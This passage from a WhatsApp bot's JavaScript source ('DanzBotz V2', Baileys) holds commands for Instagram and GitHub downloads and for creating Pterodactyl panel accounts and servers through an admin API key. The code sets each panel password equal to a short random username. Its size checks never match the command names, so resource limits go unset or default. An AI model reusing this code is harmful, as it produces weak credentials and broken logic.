m.reply(teks)
danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await danz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await danz.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    danz.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case 'cprandom': case 'cpbuttonrandom':{
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
global.panel = [crypto.randomBytes(2).toString('hex').toLowerCase()]
let menu = ` 
╭───────────✦───────────╮
     *乂 List Ram Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
➤ Dibuat Pada : ${tanggal(Date.now())}
➤ Username Panel: ${text}
© Copyright DanzBotz V2 — Update 2025`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	let buttons = [
  {
    buttonId: ".ping", 
    buttonText: { 
      displayText: "Ping"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbr"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbr"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbr"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbr"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbr"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbr"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbr"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbr"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbr"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbr"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbr"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbr"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbr"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbr"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbr"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunlir"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ];

    buttonMessage.buttons.push(...flowActions);

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case "cp1gbr": case "cp2gbr": case "cp3gbr": case "cp4gbr": case "cp5gbr": case "cp6gbr": case "cp7gbr": case "cp8gbr": case "cp9gbr": case "cp10gbr": case "cp11gbr": case "cp12gbr": case "cp13gbr": case "cp14gbr": case "cp15gbr": case "cpunlir": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else if (command == "cpunli") {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cprandom2': case 'cpbuttonrandom2':{
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
global.panel = [crypto.randomBytes(2).toString('hex').toLowerCase()]
let menu = ` 
╭───────────✦───────────╮
     *乂 List Ram Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
➤ Dibuat Pada : ${tanggal(Date.now())}
➤ Username Panel: ${text}
© Copyright DanzBotz V2 — Update 2025`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	let buttons = [
  {
    buttonId: ".ping", 
    buttonText: { 
      displayText: "Ping"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbr2"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbr2"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbr2"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbr2"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbr2"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbr2"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbr2"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbr2"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbr2"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbr2"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbr2"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbr2"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbr2"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbr2"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbr2"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunlir2"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ];

    buttonMessage.buttons.push(...flowActions);

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case "cp1gbr2": case "cp2gbr2": case "cp3gbr2": case "cp4gbr2": case "cp5gbr2": case "cp6gbr2": case "cp7gbr2": case "cp8gbr2": case "cp9gbr2": case "cp10gbr2": case "cp11gbr2": case "cp12gbr2": case "cp13gbr2": case "cp14gbr2": case "cp15gbr2": case "cpunlir2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV2}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cprandom3': case 'cpbuttonrandom3':{
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
global.panel = [crypto.randomBytes(2).toString('hex').toLowerCase()]
let menu = ` 
╭───────────✦───────────╮
     *乂 List Ram Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
➤ Dibuat Pada : ${tanggal(Date.now())}
➤ Username Panel: ${text}
© Copyright DanzBotz V2 — Update 2025`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	let buttons = [
  {
    buttonId: ".ping", 
    buttonText: { 
      displayText: "Ping"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbr3"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbr3"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbr3"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbr3"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbr3"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbr3"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbr3"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbr3"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbr3"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbr3"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbr3"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbr3"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbr3"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbr3"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbr3"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunlir3"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ];

    buttonMessage.buttons.push(...flowActions);

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case "cp1gbr3": case "cp2gbr3": case "cp3gbr3": case "cp4gbr3": case "cp5gbr3": case "cp6gbr3": case "cp7gbr3": case "cp8gbr3": case "cp9gbr3": case "cp10gbr3": case "cp11gbr3": case "cp12gbr3": case "cp13gbr3": case "cp14gbr3": case "cp15gbr3": case "cpunlir3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV3 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV3 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV3}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cprandom4': case 'cpbuttonrandom4':{
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
global.panel = [crypto.randomBytes(2).toString('hex').toLowerCase()]
let menu = ` 
╭───────────✦───────────╮
     *乂 List Ram Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
